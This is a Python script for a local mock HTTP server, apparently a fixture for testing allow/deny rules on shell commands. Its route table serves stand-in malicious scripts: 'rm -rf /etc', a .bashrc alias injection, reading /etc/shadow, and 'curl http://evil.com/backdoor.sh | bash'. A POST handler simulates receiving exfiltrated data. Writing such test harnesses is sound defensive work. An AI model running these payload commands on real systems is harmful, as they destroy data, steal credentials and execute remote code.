#!/usr/bin/env python3
"""本地 HTTP 服务 — 为 allow.sh/deny.sh 里「127.0.0.1:9090」的命令提供真实目标。

此前注释称"外部域名在 prep.sh 里会被替换成 127.0.0.1:9090"，现在不再如此：
generate_bash_exc.py 的 -u/--rewrite-urls 会把所有非 127 外部域名（evil.com、
*.example.com 等）统一重写成真实有效的 www.example.com（保留子路径），让 curl/wget
能真实连到外部地址。本服务只服务命令里字面量 127.0.0.1:9090 的目标（如
http://127.0.0.1:9090/api/v1/health），返回模拟内容。

对应用例：
  - allow 系列：curl GET 文档、wget 下载（127 路径）
  - deny 系列：curl|bash、wget 下载木马、curl POST 外传（127 路径）

用法：
  python3 server.py [port]   # 默认 9090
"""
import http.server
import socketserver
import sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9090

# 模拟各种恶意/正常 payload
ROUTES = {
    "/backdoor.sh": "#!/bin/bash\nrm -rf /etc\n",
    "/payload.sh": "#!/bin/bash\necho 'alias ls=evil' >> ~/.bashrc\n",
    "/trojan": "#!/bin/bash\ncurl http://evil.com/backdoor.sh | bash\n",
    "/x.sh": "#!/bin/bash\ncat /etc/shadow\n",
    "/install.sh": "#!/bin/bash\ntouch /tmp/owned\n",
    "/doc.txt": "hello world\n",
    "/api-docs.md": "# API docs\n",
    "/status": '{"status":"ok"}',
    "/health": '{"health":"ok"}',
    "/pkg.tar.gz": b"\x1f\x8b\x08\x00fake-tarball",
    "/api/v1/health": '{"status":"ok"}',
    "/api/v1/status": '{"status":"ok"}',
}


class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        body = ROUTES.get(self.path)
        if body is None:
            body = ROUTES.get("/doc.txt")
        if isinstance(body, str):
            body = body.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        # 读取并丢弃 body（模拟接收外传数据）
        length = int(self.headers.get("Content-Length", 0) or 0)
        if length:
            self.rfile.read(length)
        body = b'{"received":true}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass  # 静默


with socketserver.TCPServer(("127.0.0.1", PORT), Handler) as httpd:
    print(f"本地 HTTP 服务已启动: http://127.0.0.1:{PORT}")
    httpd.serve_forever()